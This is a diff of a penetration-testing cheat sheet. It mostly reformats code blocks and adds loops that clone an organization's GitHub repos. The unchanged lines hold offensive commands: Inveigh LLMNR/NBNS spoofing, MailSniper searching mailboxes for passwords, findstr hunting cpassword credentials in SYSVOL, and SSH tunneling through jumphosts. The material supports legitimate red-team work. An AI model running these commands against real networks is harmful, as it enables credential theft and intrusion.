@@ -1590,7 +1590,9 @@ Inveigh is a Windows PowerShell LLMNR/NBNS spoofer/man-in-the-middle tool design
 
 * The main Inveigh LLMNR/NBNS spoofer function.
 
-	```Invoke-Inveigh```
+```
+	Invoke-Inveigh
+```
 
 ###### Privilege Requirements:
 * Elevated Administrator or SYSTEM
@@ -1662,7 +1664,9 @@ Bypassing Dual Factor Authentication on OWA - http://www.blackhillsinfosec.com/?
 - It appears that Outlook portals that are being protected by two-factor authentication might not be covering all of the authentication protocols to Microsoft Exchange.
 - Leverages the Exchange Web Services (EWS) feature of OWA. Just have to check for the presence of mail.org.com\EWS\Exchange.asmx
 	
-	```Invoke-SelfSearch -Mailbox email@domain.com -ExchHostname mail.domain.com -Remote```
+```
+	Invoke-SelfSearch -Mailbox email@domain.com -ExchHostname mail.domain.com -Remote
+```
 
 - After the credentials have been entered MailSniper will attempt to connect to the EWS URL at https://mail.domain.com/EWS/Exchange.asmx and search the user’s inbox for key terms (by default “*pass*”, “*creds*”, and “*credentials*”).
 
@@ -1862,7 +1866,9 @@ https://adsecurity.org/?p=2362
 
  1. Passwords in SYSVOL & Group Policy Preferences
  	
- 	````findstr /S cpassword %logonserver%\sysvol\*.xml````
+ ```
+ 	findstr /S cpassword %logonserver%\sysvol\*.xml
+ ```
  	or use Get-GPPPasswords.ps1 from PowerSploit
 
  2. Exploit the MS14-068 Kerberos Vulnerability on a Domain Controller Missing the Patch
@@ -2254,6 +2260,26 @@ Check NFS share counts in a loop
 	done
 ```
 
+## Git clone organizational repos
+
+Clone all public repos
+```
+	for line in $(curl https://api.github.com/orgs/threatexpress/repos | grep -o "git@github.com:threatexpress/[^ ,\"]\+");do echo git clone $line;done
+```
+
+
+Clone private repos as well
+```
+	for line in $(curl https://api.github.com/orgs/threatexpress/repos?access_token=<EnterTokenHere> | grep -o "git@github.com:threatexpress/[^ ,\"]\+");do git clone $line;done
+```
+
+
+Pull all repos within an hierarchical folder structure
+```
+	find . -type d -depth 1 -exec git --git-dir={}/.git --work-tree=$PWD/{} pull \;
+```
+
+
 ## Shells
 
 ### TTY Shells
@@ -2378,12 +2404,16 @@ your’ll need to authorise the target to connect to you (command also run on yo
 
 Send data over ssh to port 9000 on target
 
-```ssh -L 8090:localhost:9000 james@123.123.123```
+```
+ssh -L 8090:localhost:9000 james@123.123.123
+```
 
 
 Send data over ssh to port 80 on target through jumphost
 
-```ssh -A -t -p22 -L 8800:localhost:8800 james@123.001.123.321 -t ssh -L 8800:localhost:80 james@124.123.122```
+```
+	ssh -A -t -p22 -L 8800:localhost:8800 james@123.001.123.321 -t ssh -L 8800:localhost:80 james@124.123.122
+```
 
 Start ssh using existing connections
 ```
@@ -2407,7 +2437,9 @@ Download VC++ For Python 2.7 (Needed to compile some modules)
 
 Install necessary modules (You may need to install pip first)
 
-```python -m pip install pycrypto pyasn1 pyOpenSSL pyReadline ldapdomaindump```
+```
+	python -m pip install pycrypto pyasn1 pyOpenSSL pyReadline ldapdomaindump
+```
 
 You can also download the PyCrypto binary if it fails to compile
 
